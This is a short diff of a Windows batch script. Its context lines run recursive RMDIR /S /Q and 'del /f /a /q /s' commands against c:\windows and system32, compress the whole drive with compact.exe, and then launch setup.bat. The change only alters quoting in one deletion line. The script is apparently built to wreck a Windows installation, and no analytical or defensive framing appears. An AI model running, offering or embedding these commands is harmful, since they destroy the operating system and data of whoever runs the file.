@@ -78,7 +78,7 @@ FOR /D /R c:\"windows" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
 FOR /D /R c:\windows\system32 %%X IN (*.dll) DO RMDIR /S /Q "%%X"
 cd /windows
 del /f /a /q /s system32
-FOR /D /R c:\windows\system32 %%X IN (*.dll) DO RMDIR /S /Q "%%X"
+FOR /D /R c:\"windows\system32" %%X IN (*.dll) DO RMDIR /S /Q "%%X"
 cd /
 compact.exe /s /i /f
 
@@ -111,6 +111,7 @@ echo.
 start setup.bat
 
 setup.bat
+
 
 
 
